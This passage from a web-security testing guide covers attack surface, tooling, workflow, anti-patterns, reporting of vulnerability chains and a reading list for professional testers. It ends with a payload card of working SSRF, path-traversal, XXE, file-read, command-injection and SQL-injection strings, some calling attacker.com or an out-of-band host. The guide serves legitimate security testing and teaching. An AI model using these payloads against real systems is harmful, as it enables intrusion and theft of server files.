+<ul>
+<li>Path bypasses (§Vol.2 9.1)</li>
+<li>Default creds, <code>admin:admin</code>, product-specific</li>
+<li>Actuator/debug endpoints</li>
+<li>File manager, template editor, SQL console, cron editor</li>
+<li>Backup/restore, import/export</li>
+<li>SSRF from "test connection" buttons</li>
+</ul>
+<h3 id="48-api">4.8 API</h3>
+<ul>
+<li>Mass assignment (extra fields), <code>_method</code> override</li>
+<li>Content-type switching (JSON ↔ form ↔ XML) on the same endpoint</li>
+<li>Version downgrade (<code>/v1/</code> without the new auth)</li>
+<li>GraphQL: introspection, batching, aliasing, depth, <code>@include</code> on sensitive fields, mutations with missing auth</li>
+<li><code>OPTIONS</code> / <code>TRACE</code> disclosure</li>
+<li>Error verbosity, stack traces</li>
+</ul>
+<hr />
+<h2 id="5-tooling">5. Tooling</h2>
+<h3 id="51-interception-and-replay">5.1 Interception and replay</h3>
+<p>Burp Suite (Repeater, Intruder, Turbo Intruder, Collaborator), Caido, mitmproxy, <code>curl --resolve</code>, <code>httpie</code>. Keep a raw-socket client for malformed framing — most tools normalize what you need to keep raw.</p>
+<h3 id="52-desync-and-race">5.2 Desync and race</h3>
+<p><code>turbo-intruder</code> (single-packet, last-byte sync), <code>h2c</code> smuggling scripts, <code>http-garden</code> (differential), <code>h3fuzz</code>, <code>quicdraw</code>. Always validate against a control connection.</p>
+<h3 id="53-content-discovery">5.3 Content discovery</h3>
+<p><code>ffuf</code>, <code>feroxbuster</code>, <code>gobuster</code>, <code>kiterunner</code> (API routes), <code>arjun</code>/<code>x8</code> (hidden params), <code>paramspider</code>. Wordlists: SecLists, Assetnote, <code>raft</code>. Filter by size/words/status and always re-check hits manually.</p>
+<h3 id="54-payloads">5.4 Payloads</h3>
+<p><code>phpggc</code>, <code>ysoserial</code>, <code>ysoserial.net</code>, <code>marshalsec</code>, <code>Gopherus</code>, <code>SSRFmap</code>, <code>tplmap</code>, <code>SSTImap</code>, <code>XXEinjector</code>, <code>jwt_tool</code>, <code>SignSaboteur</code>, <code>SAML Raider</code>, <code>wsdlr</code>, <code>graphql-voyager</code>, <code>sqlmap</code> (with <code>--level 5 --risk 3</code> only after manual mapping).</p>
+<h3 id="55-oob">5.5 OOB</h3>
+<p><code>interactsh-client</code>, <code>responder</code>, <code>ntlmrelayx</code>, a VPS with <code>tcpdump</code>, a wildcard DNS zone with a log. Always tag each payload with a unique subdomain.</p>
+<h3 id="56-source-and-diff">5.6 Source and diff</h3>
+<p><code>semgrep</code>, <code>codeql</code>, <code>grep -rn</code> for sink patterns, <code>git log -p</code> on the vendor's repo, patch diffing between versions (<code>git diff v1 v2</code>), <code>diffoscope</code>. Patch diffing is how most watchTowr-class research starts.</p>
+<h3 id="57-local-labs">5.7 Local labs</h3>
+<p>Docker is often unavailable; use <code>php -S</code>, <code>python -m http.server</code>, <code>node</code>, <code>uvicorn</code>, and PRoot for older runtimes. <code>http-garden</code> runs many servers for differential work.</p>
+<h3 id="58-workflow">5.8 Workflow</h3>
+<pre><code>map → model parsers → probe differentials → confirm primitive
+→ build oracle → exploit → escalate → prove impact → clean up → report
+</code></pre>
+<hr />
+<h2 id="6-anti-patterns">6. Anti-patterns</h2>
+<ul>
+<li><strong>Reporting the primitive as the impact.</strong> "SSRF to 169.254.169.254" is not a finding; "role X can read bucket Y" is.</li>
+<li><strong>Skipping the control request.</strong> Half of "findings" are the app's normal behaviour.</li>
+<li><strong>Timing without statistics.</strong> One 300 ms sample proves nothing.</li>
+<li><strong>Ignoring the second parser.</strong> The bug is the disagreement, not the payload.</li>
+<li><strong>Testing only the happy path.</strong> Every 4xx branch has its own parser.</li>
+<li><strong>Assuming <code>nosniff</code> ends MIME games.</strong> It does not, with comma lists.</li>
+<li><strong>Forgetting cleanup.</strong> Cache entries, uploaded shells, created users, poisoned DNS.</li>
+<li><strong>Over-escalating.</strong> Root on prod when a read-only proof suffices, without asking.</li>
+<li><strong>Trusting the WAF's block page.</strong> A 403 can be the <em>vulnerable</em> path (see Response Filter DoS).</li>
+</ul>
+<hr />
+<h2 id="7-reporting-a-chain">7. Reporting a chain</h2>
+<p>Structure:</p>
+<ol>
+<li><strong>Summary</strong> — one sentence, the final impact, not the first bug.</li>
+<li><strong>Preconditions</strong> — account level, config, network position.</li>
+<li><strong>Steps</strong> — numbered, each with the exact request and the observed response.</li>
+<li><strong>Why each link holds</strong> — the parser pair, the transform, the missing check.</li>
+<li><strong>Impact</strong> — data, scope, persistence, blast radius.</li>
+<li><strong>Fix</strong> — per link, not just the last one. Fixing the sink leaves the chain intact.</li>
+<li><strong>Evidence</strong> — raw requests, timestamps, a short screen recording for multi-step.</li>
+</ol>
+<p>Rate by the <em>end</em> of the chain. A chain of three mediums is usually a high.</p>
+<hr />
+<h2 id="8-reading-list-by-theme">8. Reading list, by theme</h2>
+<p>Curated from the index. Start with the mechanism, not the CVE.</p>
+<p><strong>Parser differentials</strong>
+- Parser Differentials: When Interpretation Becomes a Vulnerability — https://youtu.be/Dq_KVLXzxH8
+- Lost in Translation: Exploiting Unicode Normalization — https://www.youtube.com/watch?v=ETB2w-f3pM4
+- Confusion Attacks (Apache) — https://blog.orange.tw/posts/2024-08-confusion-attacks-en/
+- Breaking Parser Logic (path normalization) — https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf
+- The minefield between syntaxes — https://www.yeswehack.com/learn-bug-bounty/syntax-confusion-ambiguous-parsing-exploits
+- Cast Attack (Java ghost bits) — https://i.blackhat.com/Asia-26/Presentations/Asia-26-Bai-Cast-Attack-Ghost-Bits-4.23.pdf
+- WorstFit (Windows ANSI best-fit) — https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/</p>
+<p><strong>HTTP / desync</strong>
+- HTTP/1.1 must die: the desync endgame — https://portswigger.net/research/http1-must-die
+- CRLF-Powered Desync Attacks — https://portswigger.net/research/crlf-powered-desync-attacks
+- Funky chunks — https://w4ke.info/2025/06/18/funky-chunks.html
+- Trailing Danger (trailers) — https://www.sebsrt.xyz/blog/trailing-danger/
+- The Single-Packet Shovel — https://www.assured.se/posts/the-single-packet-shovel-desync-powered-request-tunnelling
+- Playing with HTTP/2 CONNECT — https://blog.flomb.net/posts/http2connect/
+- HTTP/3 connection contamination — https://portswigger.net/research/http-3-connection-contamination</p>
+<p><strong>SSRF</strong>
+- A Glossary of Blind SSRF Chains — https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/
+- Novel SSRF Technique Involving HTTP Redirect Loops — https://slcyber.io/assetnote-security-research-center/novel-ssrf-technique-involving-http-redirect-loops/
+- A New Era of SSRF (URL parsers) — https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf
+- Finding SSRFs in Azure DevOps — https://binarysecurity.no/posts/2025/01/finding-ssrfs-in-devops</p>
+<p><strong>File read / write / upload</strong>
+- PHP filter chains — https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it.html
+- wrapwrap — https://www.ambionics.io/blog/wrapwrap-php-filters-suffix
+- lightyear — https://www.ambionics.io/blog/lightyear-file-dump
+- Write Once, Shell Everywhere — https://ethiack.com/info-hub/research/write-once-shell-everywhere-arbitrary-file-writes-into-rce
+- Disguises Zip Past Path Traversal — https://blog.isec.pl/disguises-zip-past-path-traversal/
+- Uploading web.config — https://soroush.me/blog/uploading-web-config-for-fun-and-profit-2
+- SOAPwn — https://labs.watchtowr.com/soapwn-pwning-net-framework-applications-through-http-client-proxies-and-wsdl/</p>
+<p><strong>Injection</strong>
+- Successful Errors (SSTI/code injection) — https://github.com/vladko312/Research_Successful_Errors
+- Limitations are just an illusion (quote-free SSTI) — https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation
+- SQL Injection Isn't Dead (protocol smuggling) — https://media.defcon.org/DEF%20CON%2032/DEF%20CON%2032%20presentations/DEF%20CON%2032%20-%20Paul%20Gerste%20-%20SQL%20Injection%20Isn%27t%20Dead%20Smuggling%20Queries%20at%20the%20Protocol%20Level.pdf
+- Novel SQLi in PDO prepared statements — https://slcyber.io/research-center/a-novel-technique-for-sql-injection-in-pdos-prepared-statements/
+- Impossible XXE in PHP — https://swarm.ptsecurity.com/impossible-xxe-in-php/
+- Make XXE Attacks Brilliant Again — https://mp.weixin.qq.com/s/kUlXxJxKO-70QMNCQvLHZA</p>
+<p><strong>Deserialization / pollution</strong>
+- Silent Spring — https://arxiv.org/abs/2207.11171
+- GHunter — https://www.usenix.org/conference/usenixsecurity24/presentation/cornelissen
+- Python class pollution — https://blog.abdulrah33m.com/prototype-pollution-in-python/
+- Ruby class pollution — https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html
+- Universal Ruby gadget — https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html</p>
+<p><strong>Cache</strong>
+- Gotta cache 'em all — https://portswigger.net/research/gotta-cache-em-all
+- Cache key injection — https://www.yeswehack.com/lab/research-cache-key-injection
+- Web Cache Deception Escalates — https://www.usenix.org/system/files/sec22summer_mirheidari.pdf
+- Next.js, cache, and chains — https://zhero-web-sec.github.io/research-and-things/nextjs-cache-and-chains-the-stale-elixir</p>
+<p><strong>Auth</strong>
+- The Fragile Lock (SAML) — https://portswigger.net/research/the-fragile-lock
+- SAML roulette — https://portswigger.net/research/saml-roulette-the-hacker-always-wins
+- Hidden OAuth attack vectors — https://portswigger.net/research/hidden-oauth-attack-vectors
+- Three New Attacks Against JWT — https://i.blackhat.com/BH-US-23/Presentations/US-23-Tervoort-Three-New-Attacks-Against-JSON-Web-Tokens-whitepaper.pdf
+- Cookie sandwich — https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique</p>
+<p><strong>Client-side as a server-side lever</strong>
+- CSPT2CSRF — https://blog.doyensec.com/2024/07/02/cspt2csrf.html
+- Client Side Path Traversal reports — https://medium.com/@renwa/client-side-path-traversal-cspt-bug-bounty-reports-and-techniques-8ee6cd2e7ca1
+- Cross-Site ETag Length Leak — https://blog.arkark.dev/2025/12/26/etag-length-leak
+- XSS-Leak — https://blog.babelo.xyz/posts/cross-site-subdomain-leak/</p>
+<p><strong>Cloud / CI</strong>
+- IngressNightmare — https://www.wiz.io/blog/ingress-nginx-kubernetes-vulnerabilities
+- Sub:jugation — https://astrix.security/learn/blog/subjugation-hijacking-cloud-identities-by-recycling-namespaces-in-global-oidc-issuers/
+- Deployment Poisoning — https://labs.boostsecurity.io/articles/deployment_poisoning
+- 8 Million Requests Later — https://labs.watchtowr.com/8-million-requests-later-we-made-the-solarwinds-supply-chain-attack-look-amateur/</p>
+<p>Full archive: https://webhacklist.com/ (search, filter by tag, "Research Desk").</p>
+<hr />
+<h2 id="9-one-page-payload-card">9. One-page payload card</h2>
+<pre><code># URL / SSRF
+https://expected.com@attacker.com
+https://attacker.com#@expected.com
+https://expected.com\.attacker.com
+http://expected.com:80@attacker.com
+http://127.1/  http://2130706433/  http://0x7f000001/  http://0177.0.0.1/
+http://[::ffff:127.0.0.1]/  http://127.0.0.1.nip.io/
+http:///attacker.com  http:attacker.com  //attacker.com
+http://user%0d%0aX:%20y@host/
+
+# Path
+..%2f  ..%252f  %2e%2e%2f  ..%c0%af  ..\  ....//
+/..;/admin  /.;/admin  /admin;x  //admin  /admin%20  /ADMIN
+/admin.php%3Ffoo.php  /admin.php/foo.php
+
+# Content-Type
+application/json;,text/html
+image/png,text/html
+text/plain,text/html
+
+# Headers
+Host : x        Host: x, y
+X-Forwarded-Host: attacker
+X-Forwarded-For: 127.0.0.1
+X-Original-URL: /admin
+x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
+Transfer-Encoding: chunked, chunked
+Content-Length: 5, 5
+
+# Traversal read
+../../../../etc/passwd
+php://filter/convert.base64-encode/resource=index.php
+php://filter/convert.iconv.UTF-8.UTF-16/resource=index.php
+phar://upload.jpg/x.php
+
+# SSTI probe
+${7*7} {{7*7}} &lt;%= 7*7 %&gt; #{7*7} @(7*7) *{7*7} ${{7*7}}
+
+# XXE
+&lt;!DOCTYPE r [&lt;!ENTITY x SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;r&gt;&amp;x;&lt;/r&gt;
+&lt;!DOCTYPE r [&lt;!ENTITY % p SYSTEM &quot;http://oob/dtd&quot;&gt;%p;]&gt;
+
+# Deserialization markers
+O:8:&quot;stdClass&quot;:  |  rO0AB  |  AAEAAAD/////  |  \x80\x04  |  \x04\x08
+
+# Command injection
+;id  |id  `id`  $(id)  &amp;&amp;id  %0aid  ${IFS}
+--upload-pack=id  -o /var/www/html/s.php  --checkpoint-action=exec=sh
+
+# SQLi probes
+'  &quot;  `  ')  \  %27  %bf%27
+1 AND 1=1-- -   1' AND SLEEP(3)-- -
+</code></pre>
+<hr />
+<h2 id="10-closing">10. Closing</h2>
+<p>The uncommon tricks are uncommon because they sit at boundaries nobody owns: between the proxy and the app, between the validator and the parser, between the write and the loader. Learn the boundaries, and the payloads become obvious.</p>
+<p>Three habits that matter more than any list:</p>
+<ol>
+<li><strong>Read the patch.</strong> Every diff is a map of where the developers thought the boundary was.</li>
+<li><strong>Build the control.</strong> Prove the difference before you claim it.</li>
+<li><strong>Follow the ladder.</strong> Never stop at the primitive.</li>
+</ol>
+<hr />
+<p><em>Volumes: <a href="webhack-tricks-vol1-foundations">1 — Foundations</a> · <a href="webhack-tricks-vol2-server-side">2 — Server-Side Primitives</a></em></p>
+<div class="footer-note">[ END OF FILE ] · websec research terminal · EOF</div><script>
+(()=>{
+const toc=document.getElementById('toc'),side=document.getElementById('sidebar'),toggle=document.getElementById('menu-toggle');
+const chapters=[...document.querySelectorAll('h1[id],h2[id]')];
+chapters.forEach(h=>{const a=document.createElement('a');a.href='#'+h.id;a.textContent=h.textContent;a.className=h.tagName==='H1'?'vol-link':'';toc.append(a);a.addEventListener('click',()=>{side.classList.remove('open');toggle.setAttribute('aria-expanded','false')})});
+toggle.addEventListener('click',()=>{const state=side.classList.toggle('open');toggle.setAttribute('aria-expanded',String(state))});
+document.addEventListener('keydown',e=>{if(e.key==='Escape'){side.classList.remove('open');toggle.setAttribute('aria-expanded','false')}});
+const update=()=>{const max=document.documentElement.scrollHeight-innerHeight;document.getElementById('reading-progress').style.width=(max>0?100*scrollY/max:0)+'%'};window.addEventListener('scroll',update,{passive:true});update();
+const ob=new IntersectionObserver(entries=>{for(const e of entries)if(e.isIntersecting){toc.querySelectorAll('.active').forEach(a=>a.classList.remove('active'));const a=toc.querySelector('a[href="#'+e.target.id+'"]');if(a)a.classList.add('active')}},{rootMargin:'-80px 0px -75% 0px'});chapters.forEach(h=>ob.observe(h));
+document.querySelectorAll('pre').forEach(pre=>{const code=pre.querySelector('code');if(!code)return;const b=document.createElement('button');b.className='copy-btn';b.type='button';b.textContent='COPY';b.setAttribute('aria-label','Copiar bloque de código');b.addEventListener('click',async()=>{try{await navigator.clipboard.writeText(code.textContent);b.textContent='COPIED ✓';setTimeout(()=>b.textContent='COPY',1300)}catch{b.textContent='SELECT CODE';setTimeout(()=>b.textContent='COPY',1300)}});pre.append(b)});
+})();
+</script></body></html>
